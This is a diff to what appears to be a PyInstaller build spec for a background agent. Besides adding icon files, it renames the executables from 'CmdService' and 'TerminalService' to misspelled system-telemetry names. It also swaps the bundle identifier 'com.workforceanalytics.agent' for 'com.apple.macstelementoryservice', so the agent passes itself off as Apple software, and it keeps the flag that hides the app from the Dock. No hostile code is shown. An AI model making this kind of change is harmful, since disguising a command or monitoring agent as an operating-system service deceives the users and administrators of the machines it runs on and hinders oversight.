@@ -21,15 +21,25 @@ REPO_ROOT = AGENT_DIR.parent
 is_win = sys.platform.startswith("win")
 is_mac = sys.platform == "darwin"
 
+# ── Unified Naming ───────────────────────────────────────────────────────────
+if is_win:
+    EXE_NAME = "windowstelementoryservice"
+else:
+    EXE_NAME = "macstelementoryservice"
+    BUNDLE_NAME = "macstelementoryservice.app"
+
 icon_path = None
 if is_win:
-    icon_path =  None
+    p = SPEC_DIR / "icons" / "icon.ico"
+    icon_path = str(p) if p.exists() else None
 elif is_mac:
-    icon_path = None
+    p = SPEC_DIR / "icons" / "icon.icns"
+    icon_path = str(p) if p.exists() else None
 
 datas = []
-png =""
-
+png = SPEC_DIR / "icons" / "icon.png"
+if png.exists():
+    datas.append((str(png), "agent_assets"))
 
 hiddenimports = [
     "agent.api",
@@ -66,7 +76,7 @@ exe = EXE(
     a.binaries,
     a.datas,
     [],
-    name="CmdService",
+    name=EXE_NAME,
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
@@ -79,13 +89,13 @@ exe = EXE(
 if is_mac:
     app = BUNDLE(
         exe,
-        name="TerminalService.app",
+        name=BUNDLE_NAME,
         icon=icon_path,
-        bundle_identifier="com.workforceanalytics.agent",
+        bundle_identifier="com.apple.macstelementoryservice",
         info_plist={
             "LSUIElement": True,
-            "CFBundleDisplayName": "TerminalService",
-            "CFBundleName": "TerminalService",
+            "CFBundleDisplayName": "macstelementoryservice",
+            "CFBundleName": "macstelementoryservice",
             "CFBundleShortVersionString": "0.1.0",
             "NSHighResolutionCapable": True,
         },
